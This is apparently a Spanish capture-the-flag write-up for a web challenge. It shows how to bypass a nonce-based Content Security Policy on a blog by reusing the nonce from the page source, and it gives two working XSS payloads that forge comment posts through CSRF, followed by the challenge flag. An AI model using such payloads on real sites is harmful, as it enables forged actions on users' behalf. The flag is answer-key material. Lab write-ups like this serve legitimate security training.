# Desafío 8 - El blog de Pepe segurizado

## Análisis

La página tiene una CSP (Content Security Policy) estricta que requiere un `nonce` válido para ejecutar scripts. La vulnerabilidad consiste en extraer ese `nonce` del código fuente de la página e inyectar un bloque `<script>` autorizado.

## Explotación

### Solución 1

Se intercepta la petición y se modifica el campo `txtComentario` para inyectar un script con el `nonce` extraído del HTML fuente:

```http
txtComentario=<script nonce="NDM5OTA=">
    fetch('/comentarios.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
        body: 'txtComentario=Voy+a+derogar+la+ley+1542-A&btnEnviar=Enviar'
    });
</script>&btnEnviar=Enviar
```

![Desafío 8 - El blog de Pepe segurizado - imagen 1](images/01.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 2](images/02.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 3](images/03.png)

### Solución 2

Alternativa usando jQuery (`$.post`) para el CSRF:

```html
</textarea></table>
<script nonce="NDM5OTA=">
    // Ejecuta la función cuando el DOM esté listo
    $(document).ready(function() {
        // Datos del POST
        var postData = {
            txtComentario: "Voy a derogar la ley 1542-A",
            btnEnviar: "Enviar"
        };
        // Realiza la petición POST de CSRF
        $.post("/comentarios.php", postData)
            .done(function(data) {
                // Redirigir a una página limpia para evitar bucles
                window.location.href = "/comentarios.php";
            })
            .fail(function(xhr, status, error) {
                // Manejar errores
            });
    });
</script>
```

> Este código no para de ejecutar la petición en bucle hasta que se redirige.

![Desafío 8 - El blog de Pepe segurizado - imagen 4](images/04.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 5](images/05.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 6](images/06.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 7](images/07.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 8](images/08.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 9](images/09.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 10](images/10.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 11](images/11.png)

## Flag

```
c4c309a13c8fc4c5f48e72e4154dc812
```
